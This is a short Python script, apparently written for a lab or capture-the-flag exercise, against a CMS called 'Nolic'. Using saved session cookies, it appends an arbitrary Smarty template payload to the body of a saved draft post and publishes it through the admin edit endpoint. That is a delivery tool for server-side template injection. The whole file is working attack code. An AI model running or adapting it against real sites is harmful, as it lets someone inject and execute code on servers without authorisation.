import argparse
import http.cookiejar
import json
import urllib.error
import urllib.parse
import urllib.request


parser = argparse.ArgumentParser(
    description="Submit one controlled Nolic Smarty payload using the saved draft."
)
parser.add_argument("payload", help="Smarty payload appended to the saved body")
parser.add_argument("--host", default="nolic.local")
parser.add_argument("--ip", default="<LAB_IP>")
parser.add_argument("--post-id", default="6")
parser.add_argument(
    "--snapshot",
    default="private_NOLIC_DRAFT_ID6_SNAPSHOT.json",
)
parser.add_argument("--cookie-jar", default="nolic.cookies")
args = parser.parse_args()

with open(args.snapshot, encoding="utf-8") as source:
    original = json.load(source)

form = {
    "title": original["title"],
    "slug": original["slug"],
    "excerpt": original["excerpt"],
    "body": original["body"] + "\n\n" + args.payload,
    "status": "published",
    "tags": original["tags"],
}

jar = http.cookiejar.MozillaCookieJar(args.cookie_jar)
jar.load(ignore_discard=True, ignore_expires=True)
cookie = "; ".join(f"{item.name}={item.value}" for item in jar)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


request = urllib.request.Request(
    f"http://{args.ip}/admin/edit_post.php?id={args.post_id}",
    data=urllib.parse.urlencode(form).encode(),
    method="POST",
    headers={
        "Host": args.host,
        "Cookie": cookie,
        "Content-Type": "application/x-www-form-urlencoded",
    },
)

opener = urllib.request.build_opener(NoRedirect)

try:
    response = opener.open(request)
    print(f"[+] HTTP status: {response.status}")
    print(f"[+] Location: {response.headers.get('Location')}")
except urllib.error.HTTPError as error:
    print(f"[+] HTTP status: {error.code}")
    print(f"[+] Location: {error.headers.get('Location')}")
